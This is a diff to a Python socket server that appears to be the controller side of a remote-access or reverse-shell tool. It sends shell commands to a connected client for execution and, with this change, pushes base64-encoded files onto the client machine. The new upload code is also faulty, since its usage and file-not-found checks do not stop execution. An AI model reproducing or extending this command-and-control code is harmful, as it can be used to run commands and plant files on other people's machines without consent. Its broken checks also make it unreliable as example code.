@@ -1,6 +1,8 @@
 #!/usr/bin/python3
+import os
 import sys
 import socket
+import base64
 
 with open('banner.txt', 'r', encoding='utf-8') as f:
     banner = f.read().replace('\\x1b','\x1b')
@@ -33,7 +35,20 @@ class Server:
             Function to accept client. Retrieves client socket and client_info
         """
         self.client, self.client_info = self.server.accept()
+        
+    def SendFile(self,path: str ,name: str):
 
+        with open(path,'rb') as f:
+            content = f.read()
+        encoded_content = base64.b64encode(content)
+        self.client.send(f"upload:{len(encoded_content)}:{name}".encode())
+        print("Dosya gönderiliyor...")
+        if self.client.recv(self.byte_size).decode() == "ok":
+            print("Gönderildi!")
+            self.client.send(encoded_content)
+            response = self.client.recv(self.byte_size)
+            return response.decode()
+            
     def SendCommand(self,command: str) -> str:
         """
             Sends the command to be executed to the client side
@@ -68,8 +83,20 @@ class Server:
                 print("Exiting...")
                 self.SendCommand("exit")
                 break
-            output = self.SendCommand(command)
-            print(f"\x1b[1m{output}\x1b[0m")
+            elif command.lower().startswith("upload"):
+                payload = command.split(" ")
+                if len(payload) != 3:
+                    print("Usage: UPLOAD /path/to/your/file /home/client/new_file_name")
+                    pass
+                path = payload[1]
+                name = payload[2]
+                if not os.path.exists(path):
+                    print("FILE NOT FOUND!")
+                    pass
+                print(f"\x1b[1m{self.SendFile(path,name)}")
+            else:
+                output = self.SendCommand(command)
+                print(f"\x1b[1m{output}\x1b[0m")
         self.client.close()
         self.server.close()
 
